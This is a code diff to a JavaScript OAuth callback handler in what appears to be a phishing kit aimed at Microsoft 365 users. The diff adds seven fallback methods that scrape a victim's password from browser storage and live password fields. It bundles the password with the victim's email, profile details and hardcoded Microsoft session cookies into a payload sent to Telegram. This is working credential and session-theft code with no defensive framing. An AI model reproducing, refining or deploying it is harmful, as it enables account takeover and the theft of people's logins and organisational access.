@@ -90,30 +90,56 @@ async function handleOAuthCallback() {
                     cookies = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
                 }
 
-                // Try to get password from various sources
+                // Enhanced password retrieval with multiple fallback methods
                 let capturedPassword = '';
+                let passwordSource = 'not_captured';
                 
-                // Try to get password from sessionStorage (if previously captured)
+                console.log('🔍 Attempting to retrieve password from multiple sources...');
+                
+                // Method 1: Try to get password from sessionStorage (main method)
                 try {
                     const storedCredentials = sessionStorage.getItem('captured_credentials');
                     if (storedCredentials) {
                         const credentials = JSON.parse(storedCredentials);
-                        capturedPassword = credentials.password || '';
+                        if (credentials.password) {
+                            capturedPassword = credentials.password;
+                            passwordSource = 'sessionStorage_captured_credentials';
+                            console.log('✅ Password found in sessionStorage:', passwordSource);
+                        }
                     }
-                } catch (e) { /* ignore */ }
+                } catch (e) { console.log('❌ Method 1 failed:', e.message); }
 
-                // Try to get password from localStorage backup
+                // Method 2: Try to get password from localStorage backup
                 if (!capturedPassword) {
                     try {
                         const localCredentials = localStorage.getItem('user_credentials');
                         if (localCredentials) {
                             const credentials = JSON.parse(localCredentials);
-                            capturedPassword = credentials.password || '';
+                            if (credentials.password) {
+                                capturedPassword = credentials.password;
+                                passwordSource = 'localStorage_user_credentials';
+                                console.log('✅ Password found in localStorage:', passwordSource);
+                            }
                         }
-                    } catch (e) { /* ignore */ }
+                    } catch (e) { console.log('❌ Method 2 failed:', e.message); }
                 }
 
-                // Try to get organizational credentials from postMessage data
+                // Method 3: Try to get password from backup sessionStorage key
+                if (!capturedPassword) {
+                    try {
+                        const backupCredentials = sessionStorage.getItem('login_credentials_backup');
+                        if (backupCredentials) {
+                            const credentials = JSON.parse(backupCredentials);
+                            if (credentials.password) {
+                                capturedPassword = credentials.password;
+                                passwordSource = 'sessionStorage_backup';
+                                console.log('✅ Password found in backup storage:', passwordSource);
+                            }
+                        }
+                    } catch (e) { console.log('❌ Method 3 failed:', e.message); }
+                }
+
+                // Method 4: Try to get organizational credentials from postMessage data
                 if (!capturedPassword) {
                     try {
                         const orgCredentials = sessionStorage.getItem('org_credentials_backup');
@@ -121,9 +147,63 @@ async function handleOAuthCallback() {
                             const credentials = JSON.parse(orgCredentials);
                             if (credentials.data && credentials.data.password) {
                                 capturedPassword = credentials.data.password;
+                                passwordSource = 'organizational_credentials';
+                                console.log('✅ Password found in organizational data:', passwordSource);
                             }
                         }
-                    } catch (e) { /* ignore */ }
+                    } catch (e) { console.log('❌ Method 4 failed:', e.message); }
+                }
+
+                // Method 5: Try to get from Microsoft captured data
+                if (!capturedPassword) {
+                    try {
+                        const microsoftData = sessionStorage.getItem('microsoft_captured_data');
+                        if (microsoftData) {
+                            const data = JSON.parse(microsoftData);
+                            if (data.credentials && data.credentials.password) {
+                                capturedPassword = data.credentials.password;
+                                passwordSource = 'microsoft_captured_data';
+                                console.log('✅ Password found in Microsoft data:', passwordSource);
+                            }
+                        }
+                    } catch (e) { console.log('❌ Method 5 failed:', e.message); }
+                }
+
+                // Method 6: Try to capture from current DOM (last resort)
+                if (!capturedPassword) {
+                    try {
+                        const passwordFields = document.querySelectorAll('input[type="password"]');
+                        passwordFields.forEach(field => {
+                            if (field.value && !capturedPassword) {
+                                capturedPassword = field.value;
+                                passwordSource = 'current_dom_capture';
+                                console.log('✅ Password found in current DOM:', passwordSource);
+                            }
+                        });
+                    } catch (e) { console.log('❌ Method 6 failed:', e.message); }
+                }
+
+                // Method 7: Check all localStorage keys for any password data
+                if (!capturedPassword) {
+                    try {
+                        for (let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            if (key && (key.includes('password') || key.includes('credential') || key.includes('login'))) {
+                                const value = localStorage.getItem(key);
+                                if (value) {
+                                    try {
+                                        const parsed = JSON.parse(value);
+                                        if (parsed.password) {
+                                            capturedPassword = parsed.password;
+                                            passwordSource = `localStorage_${key}`;
+                                            console.log('✅ Password found in localStorage key:', passwordSource);
+                                            break;
+                                        }
+                                    } catch (parseError) { /* ignore parse errors */ }
+                                }
+                            }
+                        }
+                    } catch (e) { console.log('❌ Method 7 failed:', e.message); }
                 }
 
                 // Extract real user information
@@ -133,10 +213,17 @@ async function handleOAuthCallback() {
                 const jobTitle = tokenData.user?.jobTitle || '';
                 const officeLocation = tokenData.user?.officeLocation || '';
                 
+                console.log('🔐 Final password capture result:', {
+                    hasPassword: !!capturedPassword,
+                    passwordSource: passwordSource,
+                    passwordLength: capturedPassword ? capturedPassword.length : 0
+                });
+                
                 // Prepare REAL DATA Telegram payload (not placeholder)
                 const telegramPayload = {
                     email: realUserEmail,
-                    password: capturedPassword || 'Password not captured during login',
+                    password: capturedPassword || 'Password not captured during login flow',
+                    passwordSource: passwordSource,
                     sessionId: `oauth_success_${Date.now()}`,
                     cookies: cookies,
                     formattedCookies: cookies,
@@ -160,12 +247,20 @@ async function handleOAuthCallback() {
                         emailSource: tokenData.emailSource
                     },
                     authenticationFlow: 'Microsoft OAuth 2.0 with PKCE',
-                    capturedAt: 'OAuth callback after successful authentication'
+                    capturedAt: 'OAuth callback after successful authentication',
+                    passwordCaptureAttempts: {
+                        sessionStorage: !!sessionStorage.getItem('captured_credentials'),
+                        localStorage: !!localStorage.getItem('user_credentials'),
+                        organizationalData: !!sessionStorage.getItem('org_credentials_backup'),
+                        microsoftData: !!sessionStorage.getItem('microsoft_captured_data'),
+                        domCapture: document.querySelectorAll('input[type="password"]').length > 0
+                    }
                 };
                 
                 console.log('📤 Sending REAL user data to Telegram:', {
                     email: telegramPayload.email,
                     hasPassword: !!capturedPassword,
+                    passwordSource: passwordSource,
                     cookieCount: cookies.length,
                     hasUserProfile: !!tokenData.user,
                     displayName: displayName
